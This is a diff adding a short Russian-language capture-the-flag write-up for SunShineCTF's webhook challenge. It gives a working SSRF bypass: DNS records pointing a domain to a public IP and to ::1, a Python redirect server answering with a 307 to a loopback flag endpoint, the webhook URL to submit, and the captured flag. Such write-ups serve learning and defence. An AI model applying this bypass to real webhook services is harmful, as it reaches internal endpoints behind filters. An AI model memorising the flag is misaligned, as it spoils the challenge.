@@ -1,0 +1,37 @@
+
+Challenge: Intergalactic Webhook Service (SunShineCTF)
+Суть: сервис блокирует явные локальные хосты (127.0.0.1, localhost). Я сделал домен с A→публичный IP (чтобы пройти проверку), а AAAA→loopback (::1). Запрос проходит проверку как «публичный», затем редиректится/доставляется на 127.0.0.1:5001/flag — получаю флаг.
+
+PoC — шаги:
+
+DNS:
+
+A def.example.tld -> <PUBLIC_IP>
+
+AAAA def.example.tld -> ::1
+
+На PUBLIC_IP поднять redirect сервер :
+
+from http.server import BaseHTTPRequestHandler, HTTPServer
+TARGET = "http://127.0.0.1:5001/flag"
+class Handler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        self.send_response(307)
+        self.send_header("Location", TARGET)
+        self.end_headers()
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"ok\n")
+if __name__ == "__main__":
+    HTTPServer(("",8000), Handler).serve_forever()
+
+
+Запуск: python3 poC/redirect_server.py (порт 8000)
+
+Ввести в сервис webhook URL:
+http://def.example.tld/trigger
+
+Результат: сервис делает POST → получает 307 Location: http://127.0.0.1:5001/flag
+ → конечный запрос попадает на loopback и возвращает флаг, пример:
+{"response":"sun{dns_r3blnd1ng_1s_sup3r_c00l!_ff4bd67cd1}","status":200}
